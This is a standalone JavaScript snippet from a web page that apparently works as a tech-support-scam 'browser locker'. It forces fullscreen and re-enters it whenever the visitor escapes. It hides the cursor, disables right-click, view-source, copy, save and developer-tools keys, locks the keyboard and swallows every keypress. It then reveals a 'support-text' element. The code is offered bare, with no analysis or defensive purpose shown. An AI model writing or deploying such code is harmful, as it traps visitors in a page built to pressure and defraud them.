 <script>
        document.addEventListener('DOMContentLoaded', function () {
            var music = document.getElementById('music');
            var isPlaying = false;
            var isFullscreen = false;
            var isPopupVisible = true;

            function toggleMusic() {
                if (isPlaying) {
                    music.pause();
                } else {
                    music.play();
                }
                isPlaying = !isPlaying;
            }

            function playMusicOnClick() {
                toggleMusic();
                document.removeEventListener('click', playMusicOnClick);
            }

            document.addEventListener('click', playMusicOnClick);

            var fullscreenEnabled = document.fullscreenEnabled || document.mozFullScreenEnabled || document.documentElement.webkitRequestFullScreen;

            function enterFullscreen() {
                if (fullscreenEnabled && !isFullscreen) {
                    document.documentElement.requestFullscreen()
                        .then(() => {
                            isFullscreen = true;
                            document.body.classList.add('fullscreen');
                            showWelcomeDiv();
                            showSupportText();
                        })
                        .catch(err => console.log('Error entering fullscreen:', err));
                }
            }

            function exitFullscreen() {
                if (document.fullscreenElement) {
                    document.exitFullscreen();
                }
            }

            // Automatically re-enter fullscreen when it is exited
            document.addEventListener('fullscreenchange', function () {
                if (!document.fullscreenElement) {
                    isFullscreen = false;
                    setTimeout(() => {
                        if (!isFullscreen) {
                            enterFullscreen();
                        }
                    }, 1000); // Wait briefly to allow the user to press Escape again if desired
                }
            });

            document.addEventListener('click', enterFullscreen);

            var modalOverlay = document.getElementById('modal-overlay');
            var modalClose = document.getElementById('modal-close');

            function showModal() {
                modalOverlay.style.display = 'block';
            }

            function closeModal() {
                modalOverlay.style.display = 'none';
            }

            modalClose.addEventListener('click', closeModal);

            showModal();

            function hideCursor() {
                document.documentElement.style.cursor = 'none';
            }

            document.addEventListener('click', function () {
                hideCursor();
                document.removeEventListener('click', hideCursor);
                if (isPopupVisible) {
                    closeModal();
                    isPopupVisible = false;
                }
            });

            document.addEventListener('contextmenu', function (event) {
                event.preventDefault();
            });

            document.addEventListener('keydown', function (e) {
                if (e.ctrlKey && (e.key === 'U' || e.key === 'C' || e.key === 'S')) {
                    e.preventDefault();
                }
            });

            function preventKeyEvents(event) {
                const blockedKeyCodes = [123];
                const keyCode = event.keyCode || event.which;

                if (blockedKeyCodes.includes(keyCode)) {
                    event.preventDefault();
                    console.log(`Key with code ${keyCode} is blocked.`);
                }
            }

            window.addEventListener('keydown', preventKeyEvents);

            function showWelcomeDiv() {
                document.getElementById('welcomeDiv').style.display = 'block';
            }

            function showSupportText() {
                document.getElementById('support-text').style.display = 'block';
            }


            navigator.keyboard.lock();
            document.onkeydown = function (e) {
                return false;
            }
        });
    </script>
